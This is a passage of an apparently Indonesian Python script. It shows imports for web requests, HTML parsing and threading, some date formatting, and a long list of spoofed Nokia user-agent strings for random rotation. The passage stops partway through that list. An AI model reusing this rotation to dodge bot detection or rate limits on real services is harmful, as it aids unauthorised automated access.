# coding=utf-8

#     *file name: simple.py (vava)
#     *copyright: (C) © 2022 ~ Romi Afrizal
#     *contact me on whatsap: +6281273018924

#--- module in python
import os,sys,requests,re,bs4,datetime,json,time,random
from time import sleep as jeda
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as Romz_Xyz
from datetime import datetime
from random import randint

#--- tanggal waktu
ct = datetime.now()
n = ct.month
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month 

waktu = ("{}-{}-{}").format(hari,bulan,tahun)
bulan12 = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
 
#--- user agent
def UAS(): # random ua
	uas= (["Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 Nokia5800d-1/60.0.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.33 Mobile Safari/533.4", "Mozilla/5.0 (Series40; NokiaX2-02/10.90; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/1.0.2.26.11", "Mozilla/5.0 (Symbian/3; Series60/5.3 NokiaE7-00/111.040.1511; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.3.1.4 Mobile Safari/535.1", "Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 Nokia5230/51.0.002; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.33 Mobile Safari/533.4", "Mozilla/5.0 (Symbian/3; Series60/5.3 NokiaC6-01/111.040.1511; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.3.1.4 Mobile Safari/535.1", "Mozilla/5.0 (Series40; Nokia205.1/04.51; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; Nokia303/14.87; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Symbian/3; Series60/5.3 Nokia500/111.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.3.1.4 Mobile Safari/535.1", "Mozilla/5.0 (Series40; Nokia110/03.51; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.0.2.62.10", "Mozilla/5.0 (Series40; Nokia501/1.0; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.0.0.0.67", "Mozilla/5.0 (Series40; Nokia200/11.81; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; Nokia205/03.18; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaC5-06/23.6.015; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.33 Mobile Safari/533.4", "Mozilla/5.0 (Series40; Nokia200/11.81; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia208/03.39; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia205/03.19; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia205.1/04.51; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia201/11.81; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.0.2.68.14", "Mozilla/5.0 (Series40; Nokia2700c-2/07.80; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia200/10.61; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.7.0.0.11", "Mozilla/5.0 (Series40; Nokia206/04.51; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia205/04.51; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia201/11.81; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia200/11.95; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.2.0.0.6", "Mozilla/5.0 (Series40; Nokia501/14.0.4/java_runtime_version=Nokia_Asha_1_2; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia205.3/03.19; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia200/11.56; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.0.1.62.6", "Mozilla/5.0 (Series40; Nokia303/14.87; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia114/03.47; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia311/03.81; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.2.0.0.31", "Mozilla/5.0 (Series40; Nokia2051/03.20; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; Nokia305/07.42; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia201/11.95; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Symbian/3; Series60/5.3 NokiaN8-00/111.040.1511; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.3.1.4 Mobile Safari/535.1", "Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 Nokia5233/51.1.002; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.33 Mobile Safari/533.4", "Mozilla/5.0 (Series40; Nokia206/04.52; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; Nokia206/04.52; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia5130c-2/07.95; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.3.0.0.49", "Mozilla/5.0 (Series40; Nokia305/05.92; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; Nokia200/10.61; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.7.0.0.11", "Mozilla/5.0 (Series40; Nokia206/04.51; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia200/10.60; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia110/03.47; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; NokiaX2-02/11.84; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia2055/03.20; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; Nokia112/03.28; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia110/03.33; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; NokiaX2-02/10.91; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia110/03.04; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.7.0.0.11", "Mozilla/5.0 (Series40; Nokia210/04.12; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; Nokia200/12.04; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia306/05.93; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia206/03.59; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.2.0.0.6", "Mozilla/5.0 (Series40; Nokia308/05.85; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia202/20.36; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.0.1.62.6", "Mozilla/5.0 (Series40; Nokia210.2/06.09; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; NokiaX2-01/08.70; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; NokiaC2-02/07.48; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia305/05.92; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia311/07.36; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; NokiaX2-00/04.80; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; Nokia200/11.95; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia305/05.92; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.3.0.0.49", "Mozilla/5.0 (Series40; Nokia205/03.18; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.1.0.1", "Mozilla/5.0 (Series40; Nokia302/14.53; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia110/03.51; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia305/07.42; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.3.0.0.54", "Mozilla/5.0 (Series40; Nokia302/14.78; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; NokiaX2-02/11.63; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia112/03.32; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; NokiaC2-00/03.82; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.1.0.1","Mozilla/5.0 (Series40; Nokia2055/03.20; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaC5-03/21.0.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.30 Mobile Safari/533.4 3gpp-gba", "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.0.1.54", "Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaX6-00/40.0.002; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.33 Mobile Safari/533.4", "Mozilla/5.0 (Series40; NokiaX2-01/08.63; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.3.0.0.49", "Mozilla/5.0 (Series40; NokiaX2-02/11.79; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia110/03.04; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia206/03.58; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia200/10.60; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.3.0.0.49", "Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaC5-05/23.5.015; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.33 Mobile Safari/533.4", "Mozilla/5.0 (Series40; Nokia311/05.92; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia302/14.78; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.0.2.68.14", "Mozilla/5.0 (Series40; Nokia200/11.95; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia302/15.15; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.1.0.1", "Mozilla/5.0 (Series40; Nokia200/12.04; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.2.0.0.6", "Mozilla/5.0 (Series40; Nokia205/03.19; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; NokiaC2-03/07.48; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia202/20.36; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; Nokia200/11.56; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.1.0.0.62", "Mozilla/5.0 (Series40; Nokia205/03.18; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.1.0.0.62", "Mozilla/5.0 (Series40; Nokia311/05.92; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia311/03.90; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia202/20.28; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.2.0.0.6", "Mozilla/5.0 (Series40; Nokia200/10.60; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; Nokia112/03.51; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia200/11.95; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.1.0.1", "Mozilla/5.0 (Series40; Nokia206/04.51; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia202/20.28; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; NokiaC2-03/07.63; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia206/04.52; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.3.0.0.55", "Mozilla/5.0 (Series40; NokiaC2-02/07.66; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia200/11.81; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.3.0.0.49", "Mozilla/5.0 (Series40; Nokia206/04.51; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; Nokia200/10.58; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/1.0.2.26.11", "Mozilla/5.0 (Series40; Nokia114/03.51; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia200/11.81; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia202/20.52; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia206/04.52; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.7.0.0.11", "Mozilla/5.0 (Series40; Nokia305/05.92; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia112/03.26; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia114/03.47; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia305/07.42; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; NokiaX3-02.5/06.75; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia305/03.60; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia200/10.58; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia206/04.52; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia200/11.56; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia311/07.36; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia200/11.81; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; NokiaC2-06/07.63; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia309/05.85; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia305/05.92; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.2.0.0.6", "Mozilla/5.0 (Series40; Nokia202/20.36; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; NokiaX2-02/11.84; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; NokiaC2-06/07.57; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; NokiaC2-06/07.48; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia200/11.56; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia206/03.58; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.1.0.1", "Mozilla/5.0 (Series40; Nokia210/04.12; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia206/03.59; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.2.0.0.36", "Mozilla/5.0 (Series40; NokiaC2-02/06.96; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia200/11.64; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia308/05.85; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.7.0.0.11", "Mozilla/5.0 (Series40; Nokia311/05.92; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.1.0.1", "Mozilla/5.0 (Series40; Nokia302/14.92; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.1.0.1", "Mozilla/5.0 (Series40; Nokia306/03.63; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia111/03.32; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; NokiaC2-06/07.63; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia301/09.04; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia200/11.95; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.3.0.0.49", "Mozilla/5.0 (Series40; NokiaC2-03/06.96; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia200/11.95; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.2.0.0.36", "Mozilla/5.0 (Series40; Nokia200/10.60; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia206/03.60; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia205.1/03.18; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia111/03.32; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; NokiaC2-03/07.29; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; Nokia114/03.47; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; NokiaAsha230DualSIM/14.0.4/java_runtime_version=Nokia_Asha_1_2; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.30", "Mozilla/5.0 (Series40; Nokia208.4/04.06; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia200/12.04; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia203/20.52; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia114/03.33; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia308/08.13; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; NokiaX3-02/le6.32; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.0.2.62.10", "Mozilla/5.0 (Series40; Nokia210/06.09; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia206/03.59; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia208/03.39; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia206/04.51; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia200/11.95; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia311/05.92; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; NokiaC2-06/07.63; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia302/14.78; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; NokiaC2-03/07.65; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; Nokia200/11.56; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; NokiaC2-03/07.48a; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia205/04.51; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; NokiaC2-00/03.99; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia202/20.28; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", 